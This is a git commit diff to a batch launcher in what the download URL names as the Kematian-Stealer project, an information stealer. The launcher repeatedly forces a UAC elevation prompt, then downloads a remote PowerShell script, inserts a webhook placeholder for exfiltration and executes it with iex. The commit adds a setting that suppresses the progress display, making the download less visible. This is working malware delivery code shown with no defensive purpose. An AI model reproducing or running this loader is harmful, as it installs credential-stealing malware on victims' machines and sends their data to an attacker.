3dae873e4e7e506610ac68b9136b1d0edc28b6df
KDot227 <damndc227@gmail.com>
2024-05-19 18:30:34 -0500

    get rid of progress in bat file

--- frontend-src/main.bat
+++ frontend-src/main.bat
@@ -2,6 +2,6 @@
 cd /d %~dp0
 net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "while($true){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex"
+powershell -c "$ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex"
 timeout 3 > nul
 exit
